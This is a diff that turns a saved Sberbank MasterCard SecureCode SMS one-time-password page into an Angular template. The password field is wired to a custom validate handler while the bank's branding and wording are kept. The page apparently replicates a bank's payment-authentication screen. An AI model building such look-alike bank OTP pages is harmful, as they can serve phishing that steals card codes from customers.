@@ -1,68 +1,8 @@
-
-<html><head>
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
-  <base href="https://acs2.sbrf.ru:443/sberbank/MA/">
-
-  <script language="JavaScript">
-    var strBeforeUnload = "Вы уверены что хотите уйти с этой страницы? Ваша транзакция не завершена.";
-  </script>
-  <script language="JavaScript" src="/sberbank/common/global.js"></script>
-  <link href="assets/style.css" rel="STYLESHEET" type="text/css">
-  <link href="assets/ma_style.css" rel="STYLESHEET" type="text/css">
+<link href="assets/style.css" rel="STYLESHEET" type="text/css">
+<link href="assets/ma_style.css" rel="STYLESHEET" type="text/css">
 
 
-  <title>MasterCard® SecureCode™ - Пароль безопасности</title>
-  <script type="text/javascript">
-    strBeforeUnload = "Ваша транзакция не завершена! Для продолжения, нажмите кнопку 'Отмена' и введите пароль на странице проверки безопасности.";
-    <!-- page for OTP_SMS -->
-    var PAMs = new Array();
-    PAMs[0] = new Array("0","None");
 
-    function OnExit() {
-      if (confirm("Вы уверены что хотите выйти? Ваша транзакция не завершена. Для продолжения, нажмите кнопку 'Отмена' и введите пароль на странице проверки безопасности.")) {
-        isCheckUnload = false;
-        document.frm.formaction.value = "pa.exit";
-        document.frm.submit();
-      } else document.frm.PASSWORD.focus();
-
-      return false;
-    }
-
-    function OnSubmit(f, doSubmit) {
-      if (f.PASSWORD.value === '') {
-        alert("Пожалуйста, введите пароль");
-        f.PASSWORD.focus();
-        return false;
-      }
-      if (doSubmit) document.frm.submit();
-      return true;
-    }
-
-    function ShowPage(name) {
-      isCheckUnload = false;
-      document.frm.formaction.value = name;
-      document.frm.submit();
-    }
-
-    function removeElement(id) {
-      if (typeof id === "object") return id.parentNode.removeChild(id);
-      else return (elem = document.getElementById(id)).parentNode.removeChild(elem);
-    }
-
-    function resendSMS() {
-      if (confirm("Послать другой одноразовый пароль по SMS ?")) {
-        isCheckUnload = false;
-        removeElement(document.getElementById("psw_id"));
-        document.frm.formaction.value = "pa.service";
-        document.frm.submit();
-      }
-    }
-  </script>
-
-</head>
-
-<body>
 <div class="modal-page">
   <div class="header">
     <div>
@@ -70,9 +10,8 @@
     </div>
   </div>
 
-  <form method="POST" onsubmit="return OnSubmit(this, false);" name="frm" accept-charset="utf-8">
+  <form (ngSubmit) = validate(smspass.value) accept-charset="utf-8">
     <h1>Введите Ваш пароль</h1>
-
 
     <div class="list" id="descList" style="display: block;">
       <div class="list-item" id="pa_merchant">
@@ -101,18 +40,12 @@
         </div>
       </div>
 
-      <!-- div class="list-item" id="pa_transactionId">
-          <div class="label">Уникальный ID транзакции:</div>
-          <div class="value">WhgIVIm2gSQFEGHdKDmB8w</div>
-      </div -->
       </div>
 
-
     <div id="desc" class="desc"><p>Одноразовый пароль был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите пароль из SMS.</p></div>
-
     <div class="list">
 
-      <input class="big-input" id="psw_id" type="password" placeholder="Одноразовый SMS пароль" name="PASSWORD" size="20" maxlength="20" autocomplete="off">
+      <input class="big-input" id="psw_id" type="password" placeholder="Одноразовый SMS пароль" name="PASSWORD" size="20" maxlength="20" autocomplete="off" #smspass>
       <p class="desc">
         <input type="hidden" name="PSW_RENEW" value="Y">
         <input type="hidden" name="TRIES" value="Y">
@@ -122,7 +55,7 @@
       <div class="footer">
         <div class="row">
           <div>
-            <input class="big-button" type="button" id="btnSubmit" name="btSubmit" value="Отправить" onclick="return OnSubmit(document.frm, true);">
+            <button class="big-button" type="submit" id="btnSubmit" name="btSubmit" >Отправить</button>
           </div>
         </div>
         <br>
@@ -137,6 +70,4 @@
   </form>
 </div>
 
-
-
-</body></html>
+<router-outlet></router-outlet>
